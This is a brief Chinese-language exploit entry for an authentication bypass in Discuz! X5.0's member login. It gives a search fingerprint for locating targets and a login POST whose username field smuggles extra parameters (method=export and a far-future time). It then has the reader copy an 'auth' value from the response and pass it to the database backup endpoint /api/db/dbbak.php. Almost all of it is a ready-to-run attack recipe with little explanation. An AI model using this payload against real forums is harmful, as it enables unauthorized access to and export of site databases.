# DiscuzX5.0member存在认证绕过漏洞

DiscuzX5 ｜ 认证/授权绕过 ｜ —
- **指纹**：`app="Discuz!"`
- **请求**：`POST /member.php?mod=logging&action=login&loginsubmit=yes HTTP/1.1`

**Payload**
```
username=method%3Dexport%26time%3D9999999999%26&password=1&lssubmit=1
响应包搜索&auth
GET /api/db/dbbak.php?apptype=discuzx&code=将获取到的auth填入发起请求 HTTP/1.1
Host: xxx
```
- **响应特征**：200 member.php